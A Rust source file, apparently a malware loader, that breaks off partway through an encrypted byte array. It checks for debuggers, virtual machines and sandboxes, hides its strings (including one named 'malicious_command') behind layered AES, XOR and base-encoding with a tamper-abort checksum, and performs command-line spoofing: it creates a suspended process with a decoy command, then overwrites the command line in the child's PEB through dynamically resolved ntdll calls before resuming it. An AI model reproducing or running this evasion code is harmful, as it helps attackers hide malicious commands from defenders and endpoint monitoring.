# ! [allow (non_snake_case)]
# ! [allow (unused_unsafe)]
mod checks;
mod syscalls;
use anti_debug_rust::*;
use anti_sandbox::*;
use anti_vm::*;
use crate::syscalls::SYSCALLS;
use once_cell::sync::Lazy;
use rustdefender::*;
use std::ffi::c_void;
use std::mem::size_of;
use std::mem::transmute;
use std::mem::zeroed;
use std::ptr::null_mut;
use windows_sys::Win32::Foundation::NTSTATUS;
use windows_sys::Win32::Foundation::UNICODE_STRING;
use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
use windows_sys::Win32::System::LibraryLoader::GetProcAddress;
use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
use windows_sys::Win32::System::Threading::CREATE_NEW_CONSOLE;
use windows_sys::Win32::System::Threading::CREATE_SUSPENDED;
use windows_sys::Win32::System::Threading::CreateProcessW;
use windows_sys::Win32::System::Threading::PEB;
use windows_sys::Win32::System::Threading::PROCESS_BASIC_INFORMATION;
use windows_sys::Win32::System::Threading::PROCESS_INFORMATION;
use windows_sys::Win32::System::Threading::PROCESS_INFORMATION_CLASS;
use windows_sys::Win32::System::Threading::STARTUPINFOW;

#[inline(never)]
fn checksum_io_kvivixkqyt(data: &[u8]) -> u64 {
    let mut a = 1u64;
    let mut b = 0u64;
    for &byte in data {
        a = (a.wrapping_add(byte as u64)) % 65521;
        b = (b.wrapping_add(a)) % 65521;
    }
    (b << 32) | a
}

fn decode_kyk_acacrzkhu(encrypted: &[u8], key: &[u8], expected_sum: u64) -> &'static str {
    let s: String = {
        use aes::cipher::{BlockDecrypt, KeyInit, generic_array::GenericArray};
        use aes::{Aes128, Aes192, Aes256};
        use base85; // using base85 for base85 decoding
        use bs58; // using bs58 for base58 decoding
        use base64::{engine::general_purpose, Engine as _};

        if key.len() < 88 { return Box::leak(String::from_utf8_lossy(encrypted).to_string().into_boxed_str()); }

        let xor_key = &key[0..16];
        let aes192_key = &key[16..40];
        let aes128_key = &key[40..56];
        let aes256_key = &key[56..88];

        let mut data = encrypted.to_vec();

        let cipher256 = Aes256::new(GenericArray::from_slice(aes256_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher256.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        let cipher128 = Aes128::new(GenericArray::from_slice(aes128_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher128.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        let cipher192 = Aes192::new(GenericArray::from_slice(aes192_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher192.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        if !data.is_empty() {
            let pad_len = data[data.len() - 1] as usize;
            if pad_len <= 16 && pad_len <= data.len() {
                data.truncate(data.len() - pad_len);
            }
        }

        let xor_decoded: Vec<u8> = data.iter().enumerate().map(|(i, &b)| b ^ xor_key[i % xor_key.len()]).collect();
        let hex_str = match String::from_utf8(xor_decoded) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base64_bytes = match hex::decode(&hex_str) { Ok(b) => b, Err(_) => return Box::leak(hex_str.into_boxed_str()) };
        let base64_str = match String::from_utf8(base64_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base32_bytes = match general_purpose::STANDARD.decode(&base64_str) { Ok(b) => b, Err(_) => return Box::leak(base64_str.into_boxed_str()) };
        let base32_str = match String::from_utf8(base32_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base58_bytes = match base32::decode(base32::Alphabet::Rfc4648 { padding: true }, &base32_str) { Some(b) => b, None => return Box::leak(base32_str.into_boxed_str()) };
        let base58_str = match String::from_utf8(base58_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base85_bytes = match bs58::decode(&base58_str).into_vec() { Ok(b) => b, Err(_) => return Box::leak(base58_str.into_boxed_str()) };
        let base85_str = match String::from_utf8(base85_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base45_bytes = match base85::decode(&base85_str) { Ok(b) => b, Err(_) => return Box::leak(base85_str.into_boxed_str()) };
        let base45_str = match String::from_utf8(base45_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };

        match base45::decode(&base45_str) {
            Ok(final_bytes) => {
                let runtime_sum = checksum_io_kvivixkqyt(&final_bytes);
                if runtime_sum != expected_sum {
                    // Tampering detected! Simulated volatile write (to valid memory) then abort.
                    unsafe {
                        let mut dummy: u8 = 0;
                        std::ptr::write_volatile(&mut dummy, 1);
                    }
                    std::process::abort();
                }
                String::from_utf8_lossy(&final_bytes).to_string()
            },
            Err(_) => base45_str,
        }
    };
    Box::leak(s.into_boxed_str())
}

   pub fn abpfpj_oc () -> bool { is_virtualized () || check_user_activity () || check_for_hooking () || check_processes () || check_artifacts () || anti_sandbox :: check_uptime () || run_all_checks_hidden () }         fn ratsnbx_q (s : & str) -> Vec < u16 > { s . encode_utf16 () . collect () } fn zpjkijmo (s : & str , total_width : usize , padding_char : u16) -> Vec < u16 > { let mut wide = ratsnbx_q (s) ; if wide . len () < total_width { wide . resize (total_width , padding_char) ; } wide } fn q_mlmaupc () { if rustdefender :: run_all_checks () { return ; } let malicious_command = decode_kyk_acacrzkhu (& [110 , 36 , 168 , 23 , 219 , 120 , 155 , 94 , 223 , 237 , 167 , 60 , 183 , 126 , 165 , 251 , 72 , 247 , 131 , 182 , 94 , 76 , 254 , 100 , 37 , 231 , 115 , 39 , 89 , 185 , 80 , 196 , 135 , 115 , 88 , 133 , 118 , 254 , 100 , 59 , 38 , 93 , 33 , 113 , 83 , 244 , 19 , 82 , 191 , 5 , 102 , 70 , 112 , 173 , 112 , 71 , 118 , 51 , 34 , 145 , 243 , 1 , 66 , 35 , 81 , 187 , 76 , 170 , 149 , 62 , 57 , 126 , 53 , 22 , 228 , 76 , 169 , 227 , 85 , 156 , 240 , 167 , 64 , 80 , 225 , 218 , 94 , 113 , 189 , 111 , 140 , 140 , 195 , 130 , 61 , 229 , 51 , 223 , 11 , 154 , 166 , 157 , 44 , 88 , 182 , 43 , 16 , 221 , 133 , 41 , 119 , 152 , 124 , 202 , 235 , 244 , 93 , 230 , 159 , 123 , 20 , 86 , 243 , 119 , 66 , 220 , 200 , 99 , 71 , 72 , 43 , 88 , 101 , 188 , 2 , 176 , 128 , 201 , 46 , 222 , 94 , 145 , 126 , 34 , 168 , 16 , 190 , 215 , 88 , 38 , 230 , 239 , 245 , 76 , 128 , 211 , 180 , 23 , 26 , 218 , 81 , 156 , 101 , 128 , 88 , 66 , 203 , 171 , 212 , 0 , 170 , 53 , 175 , 37 , 147 , 199 , 104 , 15 , 139 , 217 , 24 , 95 , 155 , 41 , 122 , 147 , 17 , 3 , 219 , 101 , 64 , 44 , 159 , 48 , 146 , 165 , 254 , 65 , 6 , 239 , 4 , 195 , 85 , 228 , 12 , 10 , 59 , 92 , 18 , 71 , 224 , 95 , 175 , 202 , 121 , 109 , 84 , 84 , 175 , 187 , 3 , 13 , 153 , 128 , 168 , 20 , 34 , 69 , 14 , 38 , 33 , 215 , 209 , 42 , 17 , 114 , 187 , 51 , 195 , 118 , 93 , 47 , 13 , 27 , 231 , 190 , 241 , 231 , 127 , 223 , 228 , 78 , 69 , 8 , 216 , 172 , 186 , 66 , 68 , 139 , 123 , 191 , 91 , 57 , 14 , 226 , 141 , 71 , 33 , 122 , 48 , 89 , 69 , 222 , 239 , 121 , 160 , 138 , 112 , 202 , 45 , 121 , 97 , 136 , 212 , 211 , 160 , 30 , 0 , 161 , 228 , 76 , 252 , 135 , 71 , 7 , 75 , 42 , 74 , 233 , 246 , 174 , 2 , 4 , 235 , 159 , 144 , 239 , 125 , 123 , 185 , 155 , 42 , 250 , 218 , 228 , 219 , 15 , 96 , 85 , 0 , 119 , 21 , 109 , 180 , 213 , 116 , 133 , 155 , 63 , 248 , 251 , 29 , 143 , 103 , 201 , 172 , 19 , 11 , 24 , 164 , 110 , 40 , 136 , 239 , 148 , 164 , 9 , 156 , 191 , 163 , 100 , 64 , 223 , 94 , 122 , 13 , 238 , 226 , 19 , 188 , 30 , 186 , 11 , 146 , 210 , 206 , 11 , 107 , 39 , 119 , 7 , 209 , 94 , 41 , 205 , 89 , 176 , 148 , 52 , 226 , 74 , 173 , 35 , 105 , 193 , 155 , 215 , 50 , 144 , 143 , 108 , 54 , 142 , 95 , 104 , 25 , 179 , 115 , 189 , 221 , 91 , 56 , 58 , 70 , 39 , 55 , 115 , 163 , 251 , 212 , 177 , 139 , 114 , 195 , 155 , 103 , 183 , 131 , 244 , 92 , 164 , 198 , 106 , 176 , 253 , 148 , 165 , 123 , 145 , 126 , 54 , 25 , 196 , 186 , 160 , 51 , 183 , 86 , 86 , 128 , 157 , 244 , 145 , 121 , 48 , 161 , 194 , 16 , 168 , 182 , 55 , 129 , 122 , 32 , 4 , 93 , 195 , 226 , 144 , 12 , 163 , 25 , 194 , 167 , 225 , 129 , 186 , 127 , 90 , 6 , 22 , 92 , 112 , 221 , 202 , 207 , 226 , 235 , 125 , 201 , 1 , 55 , 6 , 180 , 118 , 113 , 233 , 180 , 67 , 159 , 251 , 112 , 88 , 65 , 117 , 13 , 107 , 203 , 154 , 226 , 154 , 192 , 134 , 180 , 196 , 99 , 131 , 87 , 218 , 114 , 36 , 84 , 1 , 2 , 88 , 43 , 150 , 56 , 125 , 3 , 137 , 72 , 192 , 179 , 60 , 148 , 65 , 89 , 214 , 9 , 197 , 207 , 150 , 43 , 6 , 181 , 68 , 18 , 208 , 79 , 50 , 79 , 160 , 29 , 48 , 238 , 197 , 177 , 223 , 19 , 150 , 70 , 69 , 214 , 24 , 167 , 16 , 80 , 216 , 106 , 51 , 189 , 122 , 83 , 175 , 211 , 118 , 200 , 128 , 198 , 201 , 65 , 108 , 83 , 23 , 204 , 137 , 51 , 117 , 184 , 49 , 154 , 182 , 30 , 115 , 190 , 27 , 237 , 248 , 146 , 182 , 207 , 62 , 99 , 243 , 200 , 142 , 196 , 63 , 226 , 81 , 19 , 127 , 103 , 166 , 114 , 170 , 231 , 157 , 39 , 115 , 41 , 118 , 211 , 71 , 67 , 197 , 94 , 54 , 108 , 85 , 58 , 91 , 39 , 30 , 140 , 18 , 140 , 153 , 161 , 34 , 50 , 44 , 164 , 56 , 234 , 104 , 55 , 47 , 78 , 100 , 116 , 76 , 154 , 196 , 244 , 142 , 109 , 1 , 60 , 250 , 74 , 204 , 54 , 158] , & [182 , 56 , 243 , 43 , 169 , 198 , 89 , 135 , 107 , 202 , 17 , 189 , 73 , 82 , 17 , 21 , 148 , 1 , 42 , 24 , 206 , 250 , 166 , 198 , 51 , 171 , 161 , 11 , 185 , 150 , 214 , 162 , 14 , 128 , 158 , 135 , 134 , 83 , 115 , 176 , 215 , 192 , 35 , 211 , 244 , 132 , 228 , 15 , 246 , 240 , 85 , 175 , 55 , 63 , 55 , 82 , 251 , 148 , 183 , 242 , 154 , 170 , 147 , 201 , 10 , 128 , 123 , 112 , 117 , 106 , 161 , 85 , 7 , 127 , 95 , 66 , 186 , 46 , 48 , 46 , 137 , 94 , 33 , 57 , 79 , 13 , 168 , 181] , 129132486726932u64) ; let malicious_command_wide = ratsnbx_q (& malicious_command) ; let spoofed_command_str = decode_kyk_acacrzkhu (& [195 , 187 , 167 , 4 , 55 , 55 , 243 , 168 , 187 , 220 , 140 , 129 , 84 , 54 , 234 , 8 , 47 , 155 , 19 , 125 , 53 , 93 , 122 , 130 , 170 , 46 , 191 , 226 , 156 , 133 , 149 , 211 , 130 , 230 , 77 , 32 , 121 , 84 , 230 , 189 , 67 , 205 , 200 , 183 , 89 , 102 , 114 , 39 , 236 , 54 , 248 , 209 , 43 , 134 , 117 , 46 , 145 , 221 , 200 , 169 , 3 , 189 , 118 , 54 , 248 , 22 , 73 , 20 , 13 , 17 , 108 , 101 , 140 , 150 , 81 , 210 , 198 , 46 , 35 , 149 , 166 , 241 , 22 , 103 , 85 , 81 , 112 , 179 , 173 , 119 , 230 , 65 , 222 , 56 , 148 , 144 , 57 , 235 , 173 , 248 , 186 , 43 , 197 , 150 , 159 , 189 , 5 , 39 , 112 , 25 , 61 , 120 , 218 , 215 , 183 , 66 , 19 , 170 , 114 , 79 , 15 , 181 , 195 , 16 , 51 , 67 , 13 , 111 , 134 , 130 , 132 , 249 , 9 , 155 , 94 , 74 , 172 , 176 , 244 , 83 , 146 , 91 , 21 , 132 , 43 , 9 , 33 , 153 , 46 , 35 , 66 , 174 , 145 , 255 , 124 , 202 , 12 , 251 , 248 , 16 , 98 , 138 , 173 , 246 , 114 , 120 , 179 , 201 , 234 , 223 , 72 , 68 , 219 , 192 , 114 , 50 , 89 , 111 , 179 , 70 , 123 , 141 , 220 , 215 , 40 , 36 , 20 , 127 , 137 , 126 , 246 , 136] , & [127 , 159 , 197 , 227 , 185 , 63 , 94 , 141 , 7 , 152 , 58 , 118 , 204 , 227 , 127 , 73 , 115 , 132 , 1 , 101 , 224 , 176 , 139 , 227 , 119 , 159 , 14 , 34 , 78 , 191 , 124 , 60 , 53 , 219 , 244 , 37 , 236 , 179 , 137 , 228 , 208 , 94 , 134 , 131 , 204 , 85 , 46 , 44 , 147 , 250 , 207 , 70 , 123 , 235 , 227 , 177 , 72 , 91 , 167 , 175 , 18 , 15 , 187 , 47 , 197 , 25 , 254 , 27 , 62 , 160 , 69 , 109 , 47 , 168 , 171 , 183 , 82 , 208 , 148 , 101 , 2 , 80 , 199 , 161 , 245 , 100 , 165 , 200] , 48507360642486u64) ; let mut spoofed_command_wide = zpjkijmo (spoofed_command_str , malicious_command . len () , ' ' as u16) ; spoofed_command_wide . push (0) ; let mut si : STARTUPINFOW = unsafe { zeroed () } ; si . cb = size_of :: < STARTUPINFOW > () as u32 ; let mut sa : SECURITY_ATTRIBUTES = unsafe { zeroed () } ; sa . nLength = size_of :: < SECURITY_ATTRIBUTES > () as u32 ; let mut pi : PROCESS_INFORMATION = unsafe { zeroed () } ; let mut current_dir = ratsnbx_q (decode_kyk_acacrzkhu (& [38 , 183 , 111 , 223 , 202 , 26 , 232 , 25 , 74 , 204 , 47 , 70 , 66 , 222 , 162 , 237 , 213 , 102 , 187 , 196 , 39 , 105 , 9 , 164 , 117 , 161 , 205 , 164 , 187 , 19 , 129 , 23 , 239 , 154 , 225 , 40 , 103 , 72 , 163 , 191 , 42 , 60 , 241 , 77 , 89 , 218 , 47 , 13 , 21 , 230 , 44 , 199 , 8 , 185 , 245 , 44 , 108 , 252 , 60 , 89 , 247 , 227 , 154 , 235 , 230 , 131 , 234 , 184 , 247 , 218 , 3 , 251 , 243 , 197 , 168 , 111 , 114 , 183 , 30 , 13 , 139 , 90 , 77 , 247 , 42 , 64 , 5 , 89 , 228 , 177 , 244 , 210 , 112 , 98 , 15 , 229 , 139 , 216 , 19 , 190 , 44 , 65 , 89 , 234 , 198 , 92 , 36 , 3 , 78 , 25 , 197 , 189 , 134 , 89 , 182 , 173 , 200 , 20 , 184 , 43 , 231 , 217 , 102 , 181 , 235 , 68 , 158 , 244 , 144 , 66 , 216 , 246 , 132 , 17 , 88 , 254 , 214 , 55 , 18 , 173 , 167 , 196 , 179 , 44] , & [11 , 5 , 174 , 0 , 105 , 210 , 237 , 177 , 225 , 150 , 249 , 253 , 95 , 127 , 170 , 244 , 197 , 16 , 239 , 237 , 109 , 25 , 29 , 45 , 69 , 146 , 179 , 170 , 41 , 69 , 32 , 122 , 142 , 89 , 15 , 42 , 17 , 43 , 185 , 181 , 9 , 145 , 36 , 129 , 56 , 251 , 252 , 4 , 59 , 192 , 104 , 10 , 114 , 58 , 27 , 82 , 121 , 134 , 199 , 184 , 207 , 41 , 92 , 236 , 157 , 199 , 234 , 29 , 94 , 213 , 8 , 155 , 200 , 230 , 228 , 163 , 37 , 69 , 249 , 178 , 181 , 227 , 100 , 31 , 207 , 187 , 118 , 62] , 26310969656385u64)) ; current_dir . push (0) ; let success = unsafe { CreateProcessW (null_mut () , spoofed_command_wide . as_mut_ptr () , & mut sa , & mut sa , 0 , CREATE_SUSPENDED | CREATE_NEW_CONSOLE , null_mut () , current_dir . as_ptr () , & mut si , & mut pi ,) } ; if success == 0 { return ; } let mut pbi : PROCESS_BASIC_INFORMATION = unsafe { zeroed () } ; let mut return_length : u32 = 0 ; let status : NTSTATUS = (dnw_ovait . NtQueryInformationProcess) (pi . hProcess as * mut c_void , 0 as PROCESS_INFORMATION_CLASS , & mut pbi as * mut _ as * mut c_void , size_of :: < PROCESS_BASIC_INFORMATION > () as u32 , & mut return_length) ; if status != 0 { unsafe { let _ = (dnw_ovait . NtClose) (pi . hProcess as * mut c_void) ; let _ = (dnw_ovait . NtClose) (pi . hThread as * mut c_void) ; } return ; } let mut peb : PEB = unsafe { zeroed () } ; let mut bytes_read : usize = 0 ; let status = unsafe { (dnw_ovait . NtReadVirtualMemory) (pi . hProcess as * mut c_void , pbi . PebBaseAddress as * mut c_void , & mut peb as * mut _ as * mut c_void , size_of :: < PEB > () , & mut bytes_read) } ; if status != 0 || bytes_read != size_of :: < PEB > () { unsafe { let _ = (dnw_ovait . NtClose) (pi . hProcess as * mut c_void) ; let _ = (dnw_ovait . NtClose) (pi . hThread as * mut c_void) ; } return ; } # [repr (C)] struct Params { _filler : [u8 ; (48 + 64)] , CommandLine : UNICODE_STRING , } let mut proc_params : Params = unsafe { zeroed () } ; let status = unsafe { (dnw_ovait . NtReadVirtualMemory) (pi . hProcess as * mut c_void , peb . ProcessParameters as * mut c_void , & mut proc_params as * mut _ as * mut c_void , size_of :: < Params > () , & mut bytes_read) } ; if status != 0 || bytes_read != size_of :: < Params > () { unsafe { let _ = (dnw_ovait . NtClose) (pi . hProcess as * mut c_void) ; let _ = (dnw_ovait . NtClose) (pi . hThread as * mut c_void) ; } return ; } let mut bytes_written : usize = 0 ; let status = unsafe { (dnw_ovait . NtWriteVirtualMemory) (pi . hProcess as * mut c_void , proc_params . CommandLine . Buffer as * mut c_void , malicious_command_wide . as_ptr () as * mut c_void , malicious_command_wide . len () * 2 , & mut bytes_written) } ; if status != 0 { unsafe { let _ = (dnw_ovait . NtClose) (pi . hProcess as * mut c_void) ; let _ = (dnw_ovait . NtClose) (pi . hThread as * mut c_void) ; } return ; } let cmd_line_len = (spoofed_command_str . len () * 2) as u16 ; let status = unsafe { let len_address = (peb . ProcessParameters as * mut u8) . add ((32 + 80)) ; (dnw_ovait . NtWriteVirtualMemory) (pi . hProcess as * mut c_void , len_address as * mut c_void , & cmd_line_len as * const _ as * mut c_void , size_of :: < u16 > () , & mut bytes_written) } ; if status != 0 { unsafe { let _ = (dnw_ovait . NtClose) (pi . hProcess as * mut c_void) ; let _ = (dnw_ovait . NtClose) (pi . hThread as * mut c_void) ; } return ; } unsafe { let mut suspend_count : u32 = 0 ; let _ = (dnw_ovait . NtResumeThread) (pi . hThread as * mut c_void , & mut suspend_count) ; let _ = (dnw_ovait . NtClose) (pi . hProcess as * mut c_void) ; let _ = (dnw_ovait . NtClose) (pi . hThread as * mut c_void) ; } }      type NtQueryInformationProcess = extern "system" fn (ProcessHandle : * mut c_void , ProcessInformationClass : PROCESS_INFORMATION_CLASS , ProcessInformation : * mut c_void , ProcessInformationLength : u32 , ReturnLength : * mut u32 ,) -> i32 ; type NtClose = extern "system" fn (Handle : * mut c_void) -> i32 ; type NtReadVirtualMemory = extern "system" fn (ProcessHandle : * mut c_void , BaseAddress : * mut c_void , Buffer : * mut c_void , NumberOfBytesToRead : usize , NumberOfBytesRead : * mut usize ,) -> i32 ; type NtWriteVirtualMemory = extern "system" fn (ProcessHandle : * mut c_void , BaseAddress : * mut c_void , Buffer : * mut c_void , NumberOfBytesToWrite : usize , NumberOfBytesWritten : * mut usize ,) -> i32 ; type NtResumeThread = extern "system" fn (ThreadHandle : * mut c_void , SuspendCount : * mut u32 ,) -> i32 ; # [derive (Clone)] pub struct Syscalls { pub NtQueryInformationProcess : NtQueryInformationProcess , pub NtClose : NtClose , pub NtReadVirtualMemory : NtReadVirtualMemory , pub NtWriteVirtualMemory : NtWriteVirtualMemory , pub NtResumeThread : NtResumeThread , } impl Syscalls { fn new () -> Result < Self , & 'static str > { unsafe { let ntdll = LoadLibraryA (decode_kyk_acacrzkhu (& [251 , 202 , 52 , 49 , 62 , 23 , 171 , 129 , 247 , 186 , 240 , 167 , 218 , 131 , 227 , 210 , 219 , 206 , 156 , 146 , 121 , 171 , 26 , 75 , 203 , 149 , 243 , 231 , 98 , 56 , 156 , 187 , 41 , 197 , 15 , 91 , 152 , 25 , 147 , 117 , 60 , 42 , 8 , 191 , 105 , 108 , 254 , 206 , 26 , 97 , 15 , 52 , 250 , 59 , 129 , 91 , 202 , 170 , 26 , 0 , 23 , 246 , 84 , 175 , 130 , 38 , 165 , 137 , 217 , 172 , 226 , 183 , 198 , 24 , 50 , 143 , 101 , 104 , 37 , 204 , 112 , 27 , 107 , 149 , 163 , 172 , 71 , 6 , 102 , 254 , 196 , 53 , 40 , 121 , 60 , 207 , 154 , 169 , 136 , 178 , 21 , 41 , 181 , 75 , 141 , 73 , 18 , 10 , 219 , 107 , 145 , 210 , 231 , 207 , 169 , 75 , 165 , 248 , 130 , 74 , 183 , 201 , 184 , 11 , 138 , 250 , 22 , 240 , 178 , 130 , 230 , 36 , 81 , 85 , 224 , 201 , 39 , 193 , 42 , 141 , 201 , 178 , 4 , 124] , & [246 , 94 , 55 , 16 , 222 , 104 , 178 , 131 , 9 , 120 , 4 , 125 , 46 , 212 , 10 , 0 , 114 , 241 , 100 , 200 , 235 , 179 , 215 , 172 , 111 , 249 , 22 , 89 , 116 , 77 , 232 , 44 , 75 , 35 , 56 , 228 , 16 , 95 , 60 , 175 , 13 , 221 , 99 , 199 , 160 , 166 , 213 , 75 , 102 , 58 , 237 , 76 , 32 , 177 , 200 , 195 , 114 , 8 , 199 , 239 , 208 , 193 , 151 , 253 , 91 , 232 , 250 , 40 , 134 , 140 , 10 , 57 , 79 , 99 , 103 , 17 , 107 , 143 , 130 , 168 , 218 , 132 , 231 , 34 , 176 , 7 , 13 , 200] , 23742579213193u64) . as_ptr ()) ; if ntdll == 0 { return Err (decode_kyk_acacrzkhu (& [18 , 21 , 234 , 30 , 42 , 71 , 222 , 118 , 248 , 98 , 47 , 6 , 152 , 220 , 122 , 66 , 243 , 122 , 227 , 1 , 148 , 164 , 178 , 188 , 181 , 92 , 130 , 31 , 215 , 166 , 176 , 141 , 236 , 233 , 32 , 190 , 166 , 92 , 42 , 241 , 1 , 232 , 54 , 49 , 8 , 244 , 82 , 105 , 55 , 67 , 137 , 200 , 195 , 227 , 166 , 46 , 198 , 128 , 2 , 81 , 26 , 44 , 4 , 109 , 242 , 77 , 74 , 159 , 233 , 38 , 2 , 119 , 22 , 188 , 36 , 29 , 48 , 235 , 103 , 13 , 98 , 228 , 34 , 186 , 140 , 110 , 42 , 218 , 90 , 20 , 116 , 109 , 9 , 133 , 252 , 103 , 250 , 246 , 156 , 15 , 215 , 157 , 108 , 71 , 150 , 3 , 212 , 238 , 9 , 172 , 66 , 39 , 36 , 248 , 26 , 164 , 236 , 10 , 128 , 132 , 185 , 217 , 18 , 155 , 46 , 68 , 27 , 104 , 54 , 7 , 133 , 178 , 228 , 94 , 142 , 41 , 223 , 90 , 85 , 67 , 94 , 218 , 21 , 156 , 27 , 184 , 143 , 225 , 78 , 88 , 67 , 47 , 154 , 250 , 191 , 209 , 142 , 88 , 153 , 10 , 171 , 193 , 178 , 212 , 109 , 225 , 182 , 13 , 220 , 95 , 242 , 71 , 87 , 39 , 39 , 53 , 88 , 162 , 172 , 189 , 143 , 248 , 62 , 203 , 221 , 72 , 233 , 141 , 117 , 165 , 35 , 51 , 54 , 145 , 36 , 54 , 37 , 252 , 104 , 104 , 189 , 136 , 219 , 64 , 128 , 140 , 197 , 67 , 71 , 89 , 122 , 157 , 38 , 163 , 193 , 158 , 21 , 215 , 122 , 201 , 235 , 152 , 145 , 228 , 73 , 80 , 177 , 95 , 133 , 170 , 149 , 217 , 129 , 17 , 106 , 246 , 72 , 8 , 145 , 138 , 237 , 88 , 102 , 86 , 116 , 198 , 128 , 15 , 117 , 47 , 53 , 184 , 209 , 138 , 42 , 141 , 114 , 178 , 6 , 119 , 145 , 78 , 14 , 93 , 200 , 52 , 240 , 147 , 44 , 10 , 132 , 173 , 146 , 29 , 161 , 207 , 237 , 187 , 115 , 68 , 221 , 4 , 77 , 155 , 3 , 81 , 45 , 100] , & [230 , 87 , 137 , 106 , 218 , 76 , 80 , 69 , 90 , 2 , 88 , 235 , 136 , 249 , 153 , 119 , 179 , 214 , 198 , 8 , 221 , 220 , 120 , 60 , 134 , 233 , 148 , 133 , 55 , 192 , 3 , 49 , 138 , 200 , 154 , 100 , 75 , 16 , 34 , 82 , 240 , 174 , 196 , 117 , 109 , 181 , 223 , 235 , 21 , 31 , 224 , 209 , 1 , 166 , 8 , 173 , 71 , 176 , 231 , 194 , 120 , 157 , 111 , 38 , 2 , 175 , 123 , 122 , 151 , 69 , 122 , 102 , 248 , 83 , 65 , 30 , 183 , 92 , 56 , 92 , 142 , 81 , 42 , 151 , 237 , 42 , 3 , 159] , 117639154239665u64)) ; } let NtQueryInformationProcess = GetProcAddress (ntdll , decode_kyk_acacrzkhu (& [126 , 71 , 65 , 179 , 68 , 92 , 129 , 249 , 45 , 115 , 209 , 53 , 42 , 27 , 198 , 176 , 79 , 165 , 193 , 207 , 190 , 50 , 43 , 156 , 28 , 201 , 144 , 68 , 53 , 23 , 69 , 248 , 78 , 134 , 149 , 17 , 73 , 128 , 36 , 29 , 249 , 108 , 4 , 135 , 167 , 40 , 0 , 175 , 234 , 182 , 239 , 201 , 62 , 195 , 172 , 98 , 125 , 20 , 39 , 242 , 63 , 225 , 29 , 245 , 26 , 145 , 159 , 82 , 117 , 89 , 249 , 129 , 34 , 253 , 154 , 199 , 213 , 195 , 57 , 103 , 225 , 48 , 229 , 67 , 198 , 198 , 186 , 245 , 89 , 120 , 166 , 191 , 203 , 88 , 97 , 210 , 244 , 54 , 118 , 80 , 252 , 183 , 200 , 18 , 26 , 111 , 201 , 61 , 15 , 22 , 246 , 188 , 152 , 231 , 181 , 185 , 205 , 29 , 221 , 227 , 77 , 69 , 23 , 247 , 12 , 202 , 185 , 179 , 194 , 251 , 26 , 113 , 155 , 226 , 245 , 195 , 87 , 79 , 40 , 181 , 24 , 1 , 138 , 185 , 141 , 191 , 25 , 153 , 200 , 10 , 59 , 154 , 191 , 143 , 165 , 25 , 220 , 207 , 247 , 160 , 79 , 204 , 124 , 186 , 10 , 47 , 47 , 97 , 144 , 29 , 105 , 217 , 249 , 32 , 250 , 24 , 180 , 147 , 192 , 10 , 111 , 50 , 117 , 68 , 253 , 214 , 90 , 234 , 129 , 203 , 69 , 30 , 235 , 80 , 242 , 253 , 176 , 185 , 183 , 61 , 145 , 36 , 221 , 223 , 132 , 152 , 201 , 221 , 238 , 39 , 82 , 35 , 127 , 224 , 137 , 231 , 215 , 100 , 86 , 63 , 93 , 90 , 111 , 144 , 131 , 191 , 160 , 86 , 125 , 90 , 176 , 82 , 108 , 74 , 19 , 146 , 57 , 87 , 106 , 67 , 191 , 18 , 101 , 12 , 32 , 134 , 205 , 66 , 24 , 224 , 109 , 30 , 182 , 51 , 102 , 234 , 236 , 186 , 36 , 147 , 216 , 225 , 130 , 168 , 115 , 122 , 250 , 178 , 96 , 121 , 44 , 0 , 109 , 163 , 80 , 143 , 116 , 178 , 198 , 185 , 35 , 2 , 62 , 160 , 197 , 118 , 166 , 153 , 178 , 233 , 136 , 193 , 4 , 211 , 20 , 135 , 8 , 184 , 194 , 138 , 239 , 138 , 96 , 166 , 197 , 210 , 94 , 48 , 131 , 185 , 75 , 28 , 186 , 178 , 65 , 4 , 43 , 243 , 234 , 88] , & [247 , 180 , 205 , 10 , 250 , 166 , 217 , 166 , 218 , 204 , 188 , 247 , 48 , 45 , 110 , 183 , 124 , 49 , 64 , 178 , 168 , 41 , 135 , 137 , 39 , 246 , 119 , 107 , 242 , 44 , 25 , 127 , 188 , 189 , 99 , 144 , 179 , 251 , 237 , 210 , 120 , 66 , 173 , 165 , 12 , 210 , 113 , 53 , 210 , 14 , 238 , 93 , 62 , 43 , 79 , 39 , 8 , 180 , 72 , 146 , 18 , 39 , 39 , 140 , 215 , 99 , 242 , 35 , 101 , 96 , 15 , 149 , 231 , 67 , 17 , 108 , 208 , 5 , 52 , 32 , 75 , 111 , 176 , 216 , 119 , 192 , 23 , 96] , 155580895332926u64) . as_ptr ()) ; let NtClose = GetProcAddress (ntdll , decode_kyk_acacrzkhu (& [129 , 82 , 161 , 231 , 251 , 194 , 163 , 40 , 194 , 20 , 39 , 170 , 31 , 174 , 142 , 155 , 60 , 197 , 249 , 151 , 185 , 5 , 34 , 161 , 171 , 203 , 40 , 238 , 191 , 150 , 24 , 151 , 223 , 161 , 10 , 122 , 132 , 128 , 206 , 227 , 102 , 161 , 212 , 49 , 75 , 96 , 149 , 18 , 130 , 7 , 226 , 139 , 139 , 244 , 108 , 20 , 101 , 102 , 106 , 6 , 226 , 255 , 137 , 11 , 0 , 227 , 82 , 215 , 69 , 99 , 35 , 66 , 244 , 47 , 65 , 27 , 233 , 177 , 19 , 204 , 217 , 31 , 250 , 129 , 27 , 173 , 33 , 248 , 81 , 62 , 29 , 25 , 79 , 138 , 118 , 107 , 114 , 127 , 158 , 176 , 204 , 70 , 80 , 86 , 56 , 79 , 218 , 8 , 153 , 173 , 199 , 53 , 18 , 150 , 230 , 14 , 246 , 197 , 94 , 39 , 192 , 49 , 63 , 195 , 245 , 52 , 80 , 43] , & [75 , 209 , 98 , 166 , 105 , 229 , 127 , 